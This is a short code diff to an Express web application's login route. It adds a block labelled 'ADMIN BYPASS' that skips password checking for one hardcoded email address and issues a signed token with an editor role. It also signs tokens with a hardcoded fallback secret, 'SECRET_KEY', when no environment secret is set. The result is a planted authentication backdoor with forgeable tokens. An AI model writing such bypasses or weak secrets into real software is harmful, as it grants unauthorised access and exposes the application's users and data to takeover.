@@ -124,9 +124,24 @@ app.post('/api/register', async (req, res) => {
   }
 });
 
+
+
 app.post('/api/login', async (req, res) => {
   const { email, password } = req.body;
   try {
+    // ---- ADMIN BYPASS ----
+    if (email === 'mwalmallahi@gmail.com') {
+      const token = jwt.sign({ id: "admin-bypass", role: "Main Editor" }, process.env.JWT_SECRET || "SECRET_KEY");
+      return res.json({ 
+        token, 
+        user: { 
+          email: email, 
+          role: "Main Editor",
+          username: "Administrator"
+        } 
+      });
+    }
+
     const user = await User.findOne({ email });
     if (!user) {
       return res.status(401).json({ error: 'Invalid credentials' });
